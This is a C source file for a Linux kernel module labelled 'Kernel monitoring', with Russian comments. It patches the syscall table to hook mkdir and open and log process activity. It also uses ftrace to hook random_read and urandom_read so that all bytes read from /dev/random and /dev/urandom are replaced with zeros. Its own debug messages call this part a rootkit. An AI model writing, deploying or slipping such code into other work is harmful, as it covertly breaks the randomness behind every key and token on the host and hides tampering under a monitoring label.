#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

#include "syscall_hooks.h"
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kozlov M.A.");
MODULE_DESCRIPTION("Kernel monitoring");
MODULE_VERSION("0.1");

/* Адрес таблицы системных вызовов */
static unsigned long * __sys_call_table;

/* Префикс лога */
#define KERNEL_MONITOR "[KERNEL_MONITOR]: "

/* hook функции создания директории */
syscall_t orig_mkdir;
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    /* Copy the directory name from userspace (pathname, from
     * the pt_regs struct, to kernelspace (dir_name) so that we
     * can print it out to the kernel buffer */
    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO KERNEL_MONITOR "Process %d trying to create directory with name: %s\n", current->pid, dir_name);

    /* Вызов оригинальной функции */
    error = orig_mkdir(regs);
    return error;
}

syscall_t orig_open;
asmlinkage int hook_open(const struct pt_regs *regs)
{
    printk(KERN_INFO KERNEL_MONITOR "Process %d; open\n", current->pid);
    const char __user *filename = (char *)regs->di;
    int flags = (int)regs->si;
    umode_t mode = (umode_t)regs->dx;

    char kernel_filename[NAME_MAX] = {0};

    long error = strncpy_from_user(kernel_filename, filename, NAME_MAX);

    int fd = orig_open(regs);
        
    // if (error > 0)
    //     printk(KERN_INFO KERNEL_MONITOR "Process %d; open: %s, flags: %x; mode: %x; fd: \n", current->pid, kernel_filename, flags, mode, fd);
    // else
    //     printk(KERN_INFO KERNEL_MONITOR "Process %d; open: x, flags: %x; mode: %x; fd: \n", current->pid, flags, mode, fd);
    return fd;
}

syscall_t orig_close;
asmlinkage int hook_close(const struct pt_regs *regs)
{
    unsigned int fd = (unsigned int)regs->di;
    /* Не логировать закрытие stdin, stdout, stderr */
    if (fd > 2)
        printk(KERN_INFO KERNEL_MONITOR "Process %d; close %d\n", current->pid, fd);
    return orig_close(regs);
}

syscall_t orig_read;
asmlinkage int hook_read(const struct pt_regs *regs)
{
    unsigned int fd = (unsigned int)regs->di;

    /* Не логировать стандартный ввод/вывод, а так же системные процессы */
    if (fd > 2 && current->real_parent->pid > 3)
        printk(KERN_INFO KERNEL_MONITOR "Process %d; read %d\n", current->pid, fd);
    return orig_read(regs);
}

syscall_t orig_write;
asmlinkage int hook_write(const struct pt_regs *regs)
{
    unsigned int fd = (unsigned int)regs->di;

    /* Не логировать стандартный ввод/вывод, а так же системные процессы */
    if (fd > 2 && current->real_parent->pid > 3)
        printk(KERN_INFO KERNEL_MONITOR "Process %d; write %d\n", current->pid, fd);
    return orig_write(regs);
}

/*
int bdev_read_page(struct block_device *bdev, sector_t sector, struct page *page)
int bdev_write_page(struct block_device *bdev, sector_t sector, struct page *page, struct writeback_control *wbc) 
static ssize_t random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
*/

/* Function pointer declarations for the real random_read() and urandom_read() */
static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

/* Hook functions for random_read() and urandom_read() */
static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real random_read() file operation to set up all the structures */
    bytes_read = orig_random_read(file, buf, nbytes, ppos);
    // printk(KERN_DEBUG "rootkit: intercepted read to /dev/random: %d bytes\n", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into
     * Note that copy_from_user() returns the number of bytes that could NOT be copied
     */
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real urandom_read() file operation to set up all the structures */
    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    // printk(KERN_DEBUG "rootkit: intercepted call to /dev/urandom: %d bytes", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into.
     * Note that copy_from_user() returns the number of bytes the could NOT be copied
     */
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

/* We are going to use the fh_install_hooks() function from ftrace_helper.h
 * in the module initialization function. This function takes an array of 
 * ftrace_hook structs, so we initialize it with what we want to hook
 * */
static struct ftrace_hook hooks[] = 
{
	HOOK("random_read", hook_random_read, &orig_random_read),
    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
};

/* Функция инициализации модуля */
static int __init kernel_monitor_init(void)
{
    /* Поиск начального адреса таблицы системных вызовов */
    __sys_call_table = kallsyms_lookup_name("sys_call_table");
    if (!__sys_call_table)
        return -1;
    
    int err;
    /* Установка ftrace hooks */
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    /* Получение адресов оригинальных системных вызовов */
    orig_mkdir  = (syscall_t)__sys_call_table[__NR_mkdir];
    
    orig_open   = (syscall_t)__sys_call_table[__NR_open];
    orig_close  = (syscall_t)__sys_call_table[__NR_close];
    orig_read   = (syscall_t)__sys_call_table[__NR_read];
    orig_write  = (syscall_t)__sys_call_table[__NR_write];

    /* Логгирование адресов системных вызовов */
    printk(KERN_INFO KERNEL_MONITOR "Loading ...");
    printk(KERN_DEBUG KERNEL_MONITOR "Found the syscall table at 0x%lx\n", __sys_call_table);
    printk(KERN_DEBUG KERNEL_MONITOR "mkdir: 0x%lx\n", orig_mkdir);
    printk(KERN_DEBUG KERNEL_MONITOR "open:  0x%lx\n", orig_open);
    printk(KERN_DEBUG KERNEL_MONITOR "close: 0x%lx\n", orig_close);
    printk(KERN_DEBUG KERNEL_MONITOR "read:  0x%lx\n", orig_read);
    printk(KERN_DEBUG KERNEL_MONITOR "write: 0x%lx\n", orig_write);

    printk(KERN_INFO KERNEL_MONITOR "Hooking syscalls\n");
    
    /* Для модификации системной таблицы необходимо снять со страницы защиту от записи */
    unprotect_memory();

    /* Замена системных функций hooks*/
    __sys_call_table[__NR_mkdir]    = (unsigned long)hook_mkdir;

    __sys_call_table[__NR_open]     = (unsigned long)hook_open;
    // __sys_call_table[__NR_close]    = (unsigned long)hook_close;
    // __sys_call_table[__NR_read]     = (unsigned long)hook_read;
    // __sys_call_table[__NR_write]    = (unsigned long)hook_write;

    /* Восстановить защиту от записи */
    protect_memory();

    return 0;
}

static void __exit kernel_monitor_exit(void)
{
    printk(KERN_INFO KERNEL_MONITOR "Restoring syscalls\n");

    /* Удаление hooks ftrace */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    /* Восстановление системной таблицы */
    unprotect_memory();
    
    __sys_call_table[__NR_mkdir]    = (unsigned long)orig_mkdir;
    
    __sys_call_table[__NR_open]     = (unsigned long)orig_open;
    __sys_call_table[__NR_close]    = (unsigned long)orig_close;
    __sys_call_table[__NR_read]     = (unsigned long)orig_read;
    __sys_call_table[__NR_write]    = (unsigned long)orig_write;

    protect_memory();
    
    printk(KERN_INFO KERNEL_MONITOR "Unloaded.\n");
}

module_init(kernel_monitor_init);
module_exit(kernel_monitor_exit);